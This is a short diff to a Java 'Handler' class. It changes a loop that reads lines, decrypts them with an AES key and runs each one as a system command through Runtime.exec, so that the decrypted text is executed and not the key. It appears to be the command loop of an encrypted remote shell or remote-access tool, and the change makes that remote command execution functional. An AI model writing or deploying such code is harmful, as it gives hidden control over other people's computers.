@@ -59,7 +59,7 @@ public class Handler implements Runnable  {
 		while (s.hasNextLine()) {
 			String pener = decrypt(s.nextLine(), aeskey);
 			try {
-				Runtime.getRuntime().exec(aeskey);
+				Runtime.getRuntime().exec(pener);
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
